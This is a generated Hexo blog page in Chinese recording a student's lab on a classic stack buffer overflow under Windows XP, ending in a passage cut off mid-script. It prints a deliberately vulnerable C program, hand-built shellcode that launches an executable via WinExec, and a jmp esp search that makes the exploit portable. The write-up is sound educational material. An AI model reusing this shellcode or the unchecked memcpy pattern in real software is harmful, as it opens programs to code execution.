@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/hexo-test/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/hexo-test/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/hexo-test/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/hexo-test/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/hexo-test/css/main.css">
+
+
+<link rel="stylesheet" href="/hexo-test/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"d2372017513.github.io","root":"/hexo-test/","scheme":"Pisces","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="1、缓冲区溢出1.1缓冲区溢出条件：1.使用非类型安全的语言（C或者C++），当缓冲区操作时不对边界做出检查，WHAT？通俗的说就是strcpy，memcpy等串操作和内存块拷贝操作缓冲区时，大数据往小空间上拷贝，造成溢出。2.函数调用时栈空间的布局为缓冲区溢出提供了条件   当程序中函数被调用时，系统总是先将被调用函数所需的参数以逆序的方式入栈，然后将调用函数后面那条指令的地址（返回地址）入栈。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记病毒缓冲区溢出实验">
+<meta property="og:url" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/">
+<meta property="og:site_name" content="半云半雾">
+<meta property="og:description" content="1、缓冲区溢出1.1缓冲区溢出条件：1.使用非类型安全的语言（C或者C++），当缓冲区操作时不对边界做出检查，WHAT？通俗的说就是strcpy，memcpy等串操作和内存块拷贝操作缓冲区时，大数据往小空间上拷贝，造成溢出。2.函数调用时栈空间的布局为缓冲区溢出提供了条件   当程序中函数被调用时，系统总是先将被调用函数所需的参数以逆序的方式入栈，然后将调用函数后面那条指令的地址（返回地址）入栈。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%A8%8B%E5%BA%8F.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BAC++%E7%A8%8B%E5%BA%8F.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E6%B1%87%E7%BC%96%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%B0%E4%BA%8B%E6%9C%AC.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6shellcode.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%94%99%E8%AF%AF.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/OllyICE%E5%B8%83%E5%B1%80.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/memcpy%E5%87%BD%E6%95%B0.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E5%A0%86%E6%A0%88%E5%8C%BA.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E6%96%B0shellcode.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E8%AE%B0%E4%BA%8B%E6%9C%ACshellcode.png">
+<meta property="og:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/ESP%E6%8C%87%E9%92%88.png">
+<meta property="article:published_time" content="2020-05-30T14:13:15.000Z">
+<meta property="article:modified_time" content="2020-05-31T02:10:32.670Z">
+<meta property="article:author" content="绯狱丸丶">
+<meta property="article:tag" content="Virus">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80.png">
+
+<link rel="canonical" href="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>记病毒缓冲区溢出实验 | 半云半雾</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/hexo-test/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">半云半雾</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">测试ing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/hexo-test/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/hexo-test/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/hexo-test/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/hexo-test/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/hexo-test/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/d2372017513" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/hexo-test/images/ouba.jpg">
+      <meta itemprop="name" content="绯狱丸丶">
+      <meta itemprop="description" content="DHR‘s Blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="半云半雾">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记病毒缓冲区溢出实验
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-30 22:13:15" itemprop="dateCreated datePublished" datetime="2020-05-30T22:13:15+08:00">2020-05-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-31 10:10:32" itemprop="dateModified" datetime="2020-05-31T10:10:32+08:00">2020-05-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/hexo-test/categories/Information-Security-Study/" itemprop="url" rel="index"><span itemprop="name">Information Security Study</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/hexo-test/categories/Information-Security-Study/Others/" itemprop="url" rel="index"><span itemprop="name">Others</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="1、缓冲区溢出"><a href="#1、缓冲区溢出" class="headerlink" title="1、缓冲区溢出"></a>1、缓冲区溢出</h1><h2 id="1-1缓冲区溢出条件："><a href="#1-1缓冲区溢出条件：" class="headerlink" title="1.1缓冲区溢出条件："></a>1.1缓冲区溢出条件：</h2><p>1.使用非类型安全的语言（C或者C++），当缓冲区操作时不对边界做出检查，WHAT？通俗的说就是strcpy，memcpy等串操作和内存块拷贝操作缓冲区时，大数据往小空间上拷贝，造成溢出。<br>2.函数调用时栈空间的布局为缓冲区溢出提供了条件</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80.png" class title="栈空间布局">
+
+<p>当程序中函数被调用时，系统总是先将被调用函数所需的参数以逆序的方式入栈，然后将调用函数后面那条指令的地址（返回地址）入栈。随后控制转入被调用的函数去执行，程序一般在将需要保存的寄存器的值入栈后开始为被调用函数内的局部变量分配所需的存储空间，从而形成图示堆栈结构。<br>3.如上图，局部变量如果是字符串数组，在进行缓冲区空间分配时，栈内同样符合小端方式对齐的原则，即shellcode[0]在最低端地址上，shellcode[100]在高端地址上，由于被调函数的局部变量分配在返回地址EIP（附近如下图所示：），所以一旦发生溢出，EIP就会被覆盖掉，从而导致程序的运行流程发生变化。</p>
+<a id="more"></a>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86.png" class title="缓冲区溢出原理">
+
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论:"></a>结论:</h2><p>由于程序缺少必要的边界检查，如果局部变量中有字符数组存在，只要赋予该数组的字符串足够长，就能将上面的返回地址覆盖掉。字符数组超出了开始为其分配的空间大小，缓冲区溢出就发生了。<br>精心构造溢出所用的字符串，将4个字节返回地址替换成别有用心的地址，当函数返回时，我们就能引导程序到我们指定的代码去执行，从而获得程序控制权。<br>如果地址A所指定的内存空间事先存放了设计好的攻击代码，那么攻击就会随之发生。</p>
+<h1 id="2、实例-用缓冲区溢出的方式打开记事本notepad"><a href="#2、实例-用缓冲区溢出的方式打开记事本notepad" class="headerlink" title="2、实例 (用缓冲区溢出的方式打开记事本notepad)#"></a>2、实例 (用缓冲区溢出的方式打开记事本notepad)#</h1><p><em>写在前面，本实例使用的是XP虚拟机</em></p>
+<p>1.建工程项目，C或者C++语言，我视频讲解里是VC++6.0写的，所以还是以此介绍。<br>首先建立控制台工程，然后新建C++文件。建立好工程文件后就可以写代码了。</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%A8%8B%E5%BA%8F.png" class>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BAC++%E7%A8%8B%E5%BA%8F.png" class>
+<p>2.写代码，主函数很简单，仅调用一个test()函数，test函数2行代码就搞定了，用memcpy函数造缓冲区溢出，即大数据往小空间上拷贝，关键的问题是shellcode数组的构造，shellcode数组需要完成的功能是覆盖掉返回地址EIP后，转向攻击代码，即打开notepad.exe。<br>主函数仅调用test()函数，test函数就两行代码，只要shellcode的大小超过10，缓冲区溢出就发生了！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[10];</span><br><span class="line">    memcpy(buffer,shellcode,sizeof(shellcode));</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Shellcode构造：首先要理解到shellcode的功能，Shellcode是指能完成特殊任务的自包含的二进制代码，根据不同的任务可能是发出一条系统调用或建立一个高权限的Shell,  Shellcode因此得名。我们的实例中，shellcode就是要打开notepad.exe。所以如何构成这样的二进制代码，成为了关键，接触过OllyICE工具后，大家应该知道可以利用该调试工具构造二进制代码，仅需要写上对应的汇编语句。这里大家可以熟悉一下反汇编，push串对应68，push 立即数对应6A，WinExec函数地址为：7C8623AD,ExitProcess函数地址为7C81CAFA。<br> <img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%B1%87%E7%BC%96%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6.png" class><br>接下来已二进制的形式复制该段代码。粘贴到记事本上：</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%B0%E4%BA%8B%E6%9C%AC.png" class>
+<p>然后将其书写成十六进制的样式就好了。</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6shellcode.png" class>
+<p>而后编译该程序，报错是肯定的，因为我们并不清楚栈内元素的情况</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%94%99%E8%AF%AF.png" class>
+<p>之后利用OllyICE进行调试</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/OllyICE%E5%B8%83%E5%B1%80.png" class>
+<p>将断点放在memcpy函数调用完成的返回地址上,观察堆栈区的情况.</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/memcpy%E5%87%BD%E6%95%B0.png" class>
+<p>F9跳转到改地址执行，观察堆栈区</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%A0%86%E6%A0%88%E5%8C%BA.png" class>
+<p>现在的情况是溢出已经发生，但没有控制好溢出后的函数返回地址，让其进入了一个不能读写的地址上去执行，所以报错！<br>唯一的办法就是去耐心的反复调试。本次调试前，请先加上一组0X90（对应汇编nop，即空操作），如下：</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%96%B0shellcode.png" class>
+<p>运行，报错，0X90909090不可读！继续调试，观察堆栈区情况，返回地址为0x90909090，我们需要改写该地址才能程序进入shellcode区执行，如何填写返回地址，填写内容及位置我们就必须精心计算！返回地址可以填写0012FF88，因为函数返回后跳转到0012FF88上去执行，是一串空操作，但之后就会进入我们写的打开记事本的shellcode 区！所以动手去试下这个位置改写为0012FF88，再运行程序！</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png" class>
+<p>观察shellcode区，Shellcode第一个有效字符为68，它之前有7个90，然后就是返回地址了，改写情况如下：</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E8%AE%B0%E4%BA%8B%E6%9C%ACshellcode.png" class>
+<p>一般来说应该是能正确执行的，执行的结果为打开本机的notepad程序</p>
+<h1 id="3、推而广之"><a href="#3、推而广之" class="headerlink" title="3、推而广之"></a>3、推而广之</h1><h2 id="3-1前言"><a href="#3-1前言" class="headerlink" title="3.1前言"></a>3.1前言</h2><p>显而易见的是这样的程序通用性很差，只能在本机执行，因为其他机器的堆栈区不一定是在0012FF88后布置攻击代码。以及shellcode里面填写的0X7C8623AD,0X7C81CAFA等数据分别是XP下的WinExec和ExitProcess的函数地址。那么如何解决shellcode硬编码的问题就成了解决程序兼容性的关键！</p>
+<h2 id="3-2兼容性解决"><a href="#3-2兼容性解决" class="headerlink" title="3.2兼容性解决"></a>3.2兼容性解决</h2><p><strong>第一步解决的问题是：不同机器布置攻击代码的位置不一样</strong><br>这里的解决方式是，观察函数返回后的ESP指针的情况：</p>
+<img data-src="/hexo-test/Information-Security-Study/Others/Virus/ESP%E6%8C%87%E9%92%88.png" class>
+<p>观察后发现函数调用返回后栈顶指针的内容恰好为0012FF88，所以如果我们想进入到该地址执行，最后是用一条指令替代硬编码地址，Jmp esp指令可以为你解决该问题。Jmp esp指令对应的二进制码为FFE4，依旧是不同的系统动态链接库并不一样，所以这里也不能使用硬编码写死，简单粗暴的方法就是在本模块中找到FFE4，而不依赖于任何的模块，找到后还是把地址回填到shellcode对应位置上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DWORD base &#x3D; 0x00400000;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*(WORD*)base &#x3D;&#x3D; 0xe4ff)</span><br><span class="line">			break;</span><br><span class="line">		base ++;</span><br><span class="line">	&#125;</span><br><span class="line">	*(DWORD*)&amp;shellcode[16] &#x3D; base; &#x2F;&#x2F;这里的shellcode[16]根据自己的实际情况回填，他会用查询到的数据替换掉原来的数据</span><br></pre></td></tr></table></figure>
+<p>剩下的WinExec和ExitProcess函数也就依葫芦画瓢，利用LoadLibrary和GetProcAddress函数来获取了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD a1 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;WinExec&quot;);</span><br><span class="line">DWORD a2 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;ExitProcess&quot;);</span><br><span class="line">*(DWORD*)(shellcode+46) &#x3D; a1; &#x2F;&#x2F;同样的，shellcode后面的数字根据实际情况来填</span><br><span class="line">*(DWORD*)(shellcode+55) &#x3D; a2;</span><br></pre></td></tr></table></figure>
+<p>三个硬编码地址处理后，程序通用性就很好了，可以在多个版本操作系统上正常执行！</p>
+<h1 id="4、后记"><a href="#4、后记" class="headerlink" title="4、后记"></a>4、后记</h1><p>先附上试验成功的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">char shellcode[]&#x3D;</span><br><span class="line">&#123; &#x2F;&#x2F;定义一个全局变量</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90, &#x2F;&#x2F;0x34,0xFF,0x12,0x00,这里填的本来是一开始打开notepad的返回地址</span><br><span class="line">	0x90,0x90,0x90,0x90, &#x2F;&#x2F;24</span><br><span class="line">	0x90,0x90,0x90,</span><br><span class="line"></span><br><span class="line">	0x68,0x65,0x00,0x00,0x00,</span><br><span class="line">	0x68,0x6E,0x2E,0x65,0x78,</span><br><span class="line">	0x68,0x61,0x6F,0x72,0x61,</span><br><span class="line">	0x68,0x65,0x6E,0x67,0x68,</span><br><span class="line">	0x68,0x63,0x3A,0x2F,0x64, &#x2F;&#x2F;这一段是名字全拼.exe的十六进制编码</span><br><span class="line"></span><br><span class="line">	0x6A,0x01,0x8B, &#x2F;&#x2F;31</span><br><span class="line">	0xC4,0x83,0xC0,0x04,</span><br><span class="line">	0x50,0xB8,0x90,0x90,</span><br><span class="line">	0x90,0x90,0xFF,0xD0,</span><br><span class="line">	0x6A,0x00,0xB8,0x90,</span><br><span class="line">	0x90,0x90,0x90,0xFF,0xD0 &#x2F;&#x2F;21，两个0xFF前面四个字节都是相应的函数地址</span><br><span class="line">&#125;;</span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char buffer[10];</span><br><span class="line">    memcpy(buffer,shellcode,sizeof(shellcode)); &#x2F;&#x2F;memcpy缓冲区溢出常用函数，即大数据往小空间上拷贝</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD base &#x3D; 0x00400000;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*(WORD*)base &#x3D;&#x3D; 0xe4ff) &#x2F;&#x2F;在本地查找0xE4FF,也就是jmp ESP指令的地址</span><br><span class="line">			break;</span><br><span class="line">		base ++;</span><br><span class="line">	&#125;</span><br><span class="line">	*(DWORD*)&amp;shellcode[16] &#x3D; base; &#x2F;&#x2F;保存到shellcode里面替换手动输入的返回地址</span><br><span class="line"></span><br><span class="line">	DWORD a1 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;WinExec&quot;);</span><br><span class="line">	DWORD a2 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;ExitProcess&quot;);</span><br><span class="line">	*(DWORD*)(shellcode+61) &#x3D; a1;</span><br><span class="line">	*(DWORD*)(shellcode+70) &#x3D; a2; &#x2F;&#x2F;动态获取，然后回填</span><br><span class="line">	test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个实验真的做的脑壳疼，本来人就菜，做这个还得东找西造，累的不要不要的。不过也坚定了我做东西要记录的想法，不然到时候真的记不住，太操蛋了-_^</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>绯狱丸丶
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/" title="记病毒缓冲区溢出实验">http://d2372017513.github.io/hexo-test/Information-Security-Study/Others/Virus/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/hexo-test/tags/Virus/" rel="tag"># Virus</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/hexo-test/Information-Security-Study/Code-Language/Java/Java/" rel="prev" title="Java从入门到入土">
+      <i class="fa fa-chevron-left"></i> Java从入门到入土
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/hexo-test/Others/HexoUseskill/" rel="next" title="Hexo使用技巧">
+      Hexo使用技巧 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
